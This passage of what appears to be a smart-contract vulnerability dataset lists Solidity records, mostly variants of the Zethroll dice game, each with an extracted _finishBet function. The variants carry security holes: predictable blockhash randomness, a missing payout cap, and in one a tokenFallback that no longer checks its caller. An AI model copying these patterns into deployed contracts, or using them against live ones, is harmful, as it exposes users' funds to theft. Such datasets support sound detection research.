{\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n setMaxProfit();\n return result;\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n require(msg.sender == ZTHTKNADDR);\n if (_from == ZethrBankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint8 chosenNumber = uint8(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(ZethrBankroll, 0);\n ZethrBankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private returns (uint){\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nrequire(roll.blockn != block.number);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(99, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\nif (profit > maxProfit){\nprofit = maxProfit;\n}\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\ndelete playerRolls[target];\nZTHTKN.transfer(target, profit + roll.tokenValue);\nreturn result;\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nsetMaxProfit();\nreturn result;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b50"
  },
  "filename": "2587.sol",
  "content": "pragma solidity ^0.4.23;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 99;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public ZethrBankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (100 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint48(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n returns (uint)\n {\n return _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private returns (uint){\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n require(roll.blockn != block.number);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(99, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n if (profit > maxProfit){\n profit = maxProfit;\n }\n contractBalance = contractBalance.sub(profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n if (delete_it){\n delete playerRolls[target];\n }\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n return result;\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n setMaxProfit();\n return result;\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n require(msg.sender == ZTHTKNADDR);\n if (_from == ZethrBankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint8 chosenNumber = uint8(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(ZethrBankroll, 0);\n ZethrBankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private returns (uint){\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nrequire(roll.blockn != block.number);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(99, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\nif (profit > maxProfit){\nprofit = maxProfit;\n}\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\nif (delete_it){\ndelete playerRolls[target];\n}\nZTHTKN.transfer(target, profit + roll.tokenValue);\nreturn result;\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nsetMaxProfit();\nreturn result;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b51"
  },
  "filename": "2589.sol",
  "content": "pragma solidity ^0.4.23;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 99;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public ZethrBankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (100 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint40(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n returns (uint)\n {\n return _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private returns (uint){\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n require(roll.blockn != block.number);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(99, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n contractBalance = contractBalance.sub(profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n if (delete_it){\n delete playerRolls[target];\n }\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n return result;\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n setMaxProfit();\n return result;\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n require(msg.sender == ZTHTKNADDR);\n if (_from == ZethrBankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint8 chosenNumber = uint8(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(ZethrBankroll, 0);\n ZethrBankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private returns (uint){\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nrequire(roll.blockn != block.number);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(99, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\nif (delete_it){\ndelete playerRolls[target];\n}\nZTHTKN.transfer(target, profit + roll.tokenValue);\nreturn result;\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nsetMaxProfit();\nreturn result;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b52"
  },
  "filename": "2593.sol",
  "content": "pragma solidity ^0.4.23;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 99;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public ZethrBankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (100 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint40(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n returns (uint)\n {\n return _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private returns (uint){\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n require(roll.blockn != block.number);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(99, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n contractBalance = contractBalance.sub(profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit();\n if (delete_it){\n delete playerRolls[target];\n }\n ZTHTKN.transfer(target, profit + roll.tokenValue);\n return result;\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n contractBalance = contractBalance.add(roll.tokenValue);\n setMaxProfit();\n return result;\n }\n }\n struct TKN {address sender; uint value;}\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool) {\n if (_from == ZethrBankroll) {\n contractBalance = contractBalance.add(_value);\n uint oldMaxProfit = maxProfit;\n setMaxProfit();\n emit MaxProfitChanged(oldMaxProfit, maxProfit);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint8 chosenNumber = uint8(_data[0]);\n _playerRollDice(chosenNumber, _tkn);\n }\n return true;\n }\n function setMaxProfit() internal {\n emit CurrentContractBalance(contractBalance);\n maxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function ownerUpdateContractBalance(uint newContractBalance) public\n onlyOwner\n {\n contractBalance = newContractBalance;\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit();\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerTransferZTH(address sendTo, uint amount) public\n onlyOwner\n {\n contractBalance = contractBalance.sub(amount);\n setMaxProfit();\n require(ZTHTKN.transfer(sendTo, amount));\n emit LogOwnerTransfer(sendTo, amount);\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerSetBankroll(address newBankroll) public\n onlyOwner\n {\n ZTHTKN.approve(ZethrBankroll, 0);\n ZethrBankroll = newBankroll;\n ZTHTKN.approve(newBankroll, MAX_INT);\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private returns (uint){\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nrequire(roll.blockn != block.number);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(99, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\nif (delete_it){\ndelete playerRolls[target];\n}\nZTHTKN.transfer(target, profit + roll.tokenValue);\nreturn result;\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nsetMaxProfit();\nreturn result;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc69750a970a4fdc0b53"
  },
  "filename": "2619.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract UnityToken is StandardToken, SafeMath {\n string public constant name = \"Ping\";\n string public constant symbol = \"PIN\";\n uint256 public constant decimals = 3;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 3;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function UnityToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(10000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n 